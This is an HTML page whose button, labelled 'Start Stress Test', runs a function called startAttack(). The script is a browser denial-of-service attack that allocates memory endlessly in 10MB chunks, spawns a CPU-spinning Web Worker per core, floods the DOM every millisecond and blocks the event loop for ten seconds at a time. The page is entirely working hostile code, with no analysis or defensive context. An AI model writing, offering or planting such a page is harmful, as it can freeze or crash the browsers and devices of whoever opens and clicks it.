<!DOCTYPE html>
<html>
<body>
  <button onclick="startAttack()">Start Stress Test</button>
  <script>
    function startAttack() {
      // ====== Memory Overload ======
      const memoryBloat = [];
      const allocateMemory = () => {
        while (true) {
          memoryBloat.push(new Uint8Array(1024 * 1024 * 10)); // 10MB chunks
        }
      };

      // ====== CPU Overload (Multi-threaded) ======
      const spawnWorkers = () => {
        for (let i = 0; i < navigator.hardwareConcurrency; i++) {
          const workerCode = `while(true) { console.log("Worker ${i} crushing CPU..."); }`;
          const blob = new Blob([workerCode], { type: 'application/javascript' });
          new Worker(URL.createObjectURL(blob));
        }
      };

      // ====== DOM Overload ======
      const floodDOM = () => {
        setInterval(() => {
          const div = document.createElement('div');
          div.innerHTML = 'DOM Overload'.repeat(1000);
          document.body.appendChild(div);
        }, 1);
      };

      // ====== Block the Event Loop ======
      const blockEventLoop = () => {
        setInterval(() => {
          const start = Date.now();
          while (Date.now() - start < 10000) {} // Block for 10 seconds
        }, 100);
      };

      // Start all attacks
      allocateMemory();
      spawnWorkers();
      floodDOM();
      blockEventLoop();
    }
  </script>
</body>
</html>
